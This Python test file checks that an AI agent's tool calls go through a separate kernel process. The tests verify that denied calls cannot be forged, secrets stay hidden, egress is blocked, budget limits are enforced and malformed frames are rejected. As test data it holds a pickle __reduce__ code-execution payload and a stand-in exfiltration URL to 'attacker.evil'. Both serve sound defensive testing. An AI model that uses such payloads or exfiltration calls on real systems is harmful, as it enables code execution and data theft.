"""The real no-bypass boundary: a kernel in a separate process (contract §2, §13).

In one interpreter the agent can always reach transport internals and forge the result it
*observes* (an inert residual — effects stay kernel-mediated). The boundary that actually
forecloses it is process/sandbox isolation: with the gateway, broker, secret vault, and
per-call reply state in another address space, there is nothing for agent code to reach or
pre-seed, and a result can only be what the kernel sent back over the pipe.
"""

import gc
import json
import multiprocessing
import os
import pickle
import tempfile
from dataclasses import replace

import pytest

from mandate.demo import DEMO_SECRET_VALUE, DEMO_VAULT, build_bundle, build_tools, build_gateway
from mandate.errors import MandateError
from mandate.kernel import ProcessKernelService, SyscallGateway
from mandate.model import Decision

pytestmark = pytest.mark.skipif(
    "fork" not in multiprocessing.get_all_start_methods(),
    reason="process isolation demo requires the fork start method",
)


# A would-be code-execution payload: if this object is ever *unpickled*, _touch_marker
# runs. The JSON wire format means it is never unpickled in the kernel.
_MARKER = os.path.join(tempfile.gettempdir(), f"mandate_rce_marker_{os.getpid()}")


def _touch_marker(path):  # module-level so pickle can reference it
    with open(path, "w") as handle:
        handle.write("pwned")
    return {}


class _Evil:
    def __reduce__(self):
        return (_touch_marker, (_MARKER,))


def _clear_marker():
    if os.path.exists(_MARKER):
        os.remove(_MARKER)


def _tiny_budget_gateway():
    """Module-level factory (built inside the child) with a 2-step budget for the kill test."""
    bundle = build_bundle()
    bundle = replace(bundle, budget=replace(bundle.budget, max_steps_per_run=2))
    return SyscallGateway(bundle, tools=build_tools(), vault=DEMO_VAULT)


def _raising_tool(args, **kw):
    raise RuntimeError("driver failure across the boundary")


def _raising_tool_gateway():
    from mandate.kernel import Tool

    tools = build_tools()  # keeps the real github_repo_read alongside the raising one
    tools.register(Tool("boom_read", "github.repo.read", cost_usd=0.002, fn=_raising_tool))
    return SyscallGateway(build_bundle(), tools=tools, vault=DEMO_VAULT)


def test_kernel_runs_in_a_separate_process():
    import os

    with ProcessKernelService(build_gateway) as service:
        assert service.pid is not None
        assert service.pid != os.getpid()


def test_denied_call_cannot_be_forged_across_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call("payment.send", "nope", resource={})
        assert res.status == "denied"
        assert res.decision is Decision.DENY
        # The operator-side audit (fetched over the control pipe) shows the real verdict.
        assert service.audit_events()[-1].status == "denied"


def test_agent_channel_exposes_no_request_queue_or_reply_boxes():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        channel = agent._channel
        # The in-process forge used agent._channel._requests.queue — there is no such
        # queue here; the agent end is a pipe.
        assert not hasattr(channel, "_requests")
        assert not hasattr(channel, "_responses")


def test_no_kernel_object_is_reachable_from_the_agent_client():
    import types

    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        seen = {id(agent)}
        stack = [agent]
        skip = (type, types.ModuleType, types.FunctionType, types.MethodType,
                types.BuiltinFunctionType)
        while stack:
            for ref in gc.get_referents(stack.pop()):
                if id(ref) in seen:
                    continue
                seen.add(id(ref))
                if not isinstance(ref, skip):
                    stack.append(ref)
        reachable_types = {type(o).__name__ for o in gc.get_objects() if id(o) in seen}
        # None of the kernel's privileged objects live in the agent's address space.
        for name in ("SyscallGateway", "SecretBroker", "BudgetMeter", "AuditLog", "EgressGuard"):
            assert name not in reachable_types


def test_secret_never_crosses_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call("semantic_scholar.search", "semantic_scholar_search", {"q": "x"})
        assert res.status == "ok"
        assert DEMO_SECRET_VALUE not in repr(res.result)
        assert res.result["key_fingerprint"].startswith("sha256:")


def test_egress_exfiltration_is_blocked_across_the_boundary():
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        res = agent.tool_call(
            "fs.workspace.rw", "code_exec", {"fetch": ["https://attacker.evil/x?d=stolen"]}
        )
        assert res.status == "blocked"


def test_budget_kill_switch_works_across_the_boundary():
    with ProcessKernelService(_tiny_budget_gateway) as service:
        agent = service.client()
        statuses = [
            agent.tool_call(
                "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
            ).status
            for _ in range(5)
        ]
        assert "killed" in statuses
        assert service.killed() is True


def _raw_bytes_roundtrip(agent, raw: bytes):
    """Put arbitrary raw bytes on the agent pipe and read the kernel's JSON reply (a dict)."""
    conn, lock = agent._channel._conn, agent._channel._lock
    with lock:
        conn.send_bytes(raw)
        assert conn.poll(5), "kernel did not reply to a raw frame"
        return json.loads(conn.recv_bytes().decode("utf-8"))


def _json_frame(syscall, payload):
    return json.dumps({"op": "syscall", "syscall": syscall, "payload": payload}).encode("utf-8")


def test_malformed_agent_frame_does_not_crash_the_kernel():
    # A syscall frame missing required fields ("tool.call" with an empty payload).
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        reply = _raw_bytes_roundtrip(agent, _json_frame("tool.call", {}))
        assert reply["status"] == "denied"  # untrusted input → denied, not a crash
        assert service._proc.is_alive()
        # The kernel still serves a normal call.
        ok = agent.tool_call(
            "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
        )
        assert ok.status == "ok"


def test_tool_exception_is_audited_across_the_boundary():
    # An authorized tool that raises is charged-and-audited in the kernel process; the agent
    # sees an error result and the operator's audit (over the control pipe) records it.
    with ProcessKernelService(_raising_tool_gateway) as service:
        agent = service.client()
        res = agent.tool_call(
            "github.repo.read", "boom_read", {}, resource={"repos": ["acme/research"]}
        )
        assert res.status == "error"
        events = service.audit_events()
        assert events and events[-1].status == "error" and events[-1].cost_usd == 0.002
        assert service._proc.is_alive()
        # The kernel keeps serving; a healthy read tool still works.
        ok = agent.tool_call(
            "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
        )
        assert ok.status == "ok"


def test_assorted_malformed_frames_are_each_rejected_not_fatal():
    bad_frames = [
        _json_frame("memory.write", {"scope": "s"}),                       # missing 'obj'
        _json_frame("bogus.syscall", {}),                                  # unknown syscall
        _json_frame("tool.call", "not-a-dict"),                            # payload not an object
        _json_frame("tool.call", {"capability": "x", "name": "y", "args": "bad"}),  # args not object
        json.dumps({"op": "nope"}).encode("utf-8"),                        # not a syscall op
        json.dumps(42).encode("utf-8"),                                    # top-level not an object
        b"this is not json at all",                                        # unparseable bytes
        pickle.dumps({"op": "syscall"}),                                   # raw pickle — must NOT be unpickled
    ]
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        for raw in bad_frames:
            reply = _raw_bytes_roundtrip(agent, raw)
            assert reply["status"] == "denied", raw[:40]
        assert service._proc.is_alive()
        assert agent.tool_call(
            "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
        ).status == "ok"


def test_hostile_data_labels_are_rejected_at_the_boundary():
    # data_labels with a non-string element is rejected at input validation, so it can
    # never reach the policy matcher.
    with ProcessKernelService(build_gateway) as service:
        agent = service.client()
        reply = _raw_bytes_roundtrip(agent, json.dumps({
            "op": "syscall", "syscall": "tool.call",
            "payload": {
                "capability": "github.repo.read", "name": "github_repo_read",
                "resource": {"repos": ["acme/research"]}, "data_labels": [{"x": 1}],
            },
        }).encode("utf-8"))
        assert reply["status"] == "denied"
        assert service._proc.is_alive()


def test_malicious_object_in_args_never_crosses_the_boundary():
    # The reviewer's exact attack path: a malicious object passed through the public API.
    # JSON encoding rejects it in the *agent* process, so it is never serialized or sent.
    _clear_marker()
    try:
        with ProcessKernelService(build_gateway) as service:
            agent = service.client()
            with pytest.raises(MandateError):
                agent.tool_call(
                    "github.repo.read", "github_repo_read",
                    {"x": _Evil()}, resource={"repos": ["acme/research"]},
                )
            assert not os.path.exists(_MARKER)  # never serialized → never executed
            assert service._proc.is_alive()
    finally:
        _clear_marker()


def test_raw_pickle_bytes_on_the_agent_pipe_do_not_execute_code():
    # Even bypassing the SDK and writing raw pickle bytes of a code-execution payload onto
    # the pipe: the kernel does json.loads (never pickle.loads), so __reduce__ never runs.
    _clear_marker()
    try:
        with ProcessKernelService(build_gateway) as service:
            agent = service.client()
            evil_pickle = pickle.dumps(_Evil())  # dumps calls __reduce__, not _touch_marker
            assert not os.path.exists(_MARKER)
            reply = _raw_bytes_roundtrip(agent, evil_pickle)
            assert reply["status"] == "denied"   # rejected as unparseable JSON
            assert not os.path.exists(_MARKER)    # the payload never executed in the kernel
            assert service._proc.is_alive()
            assert agent.tool_call(
                "github.repo.read", "github_repo_read", {}, resource={"repos": ["acme/research"]}
            ).status == "ok"
    finally:
        _clear_marker()
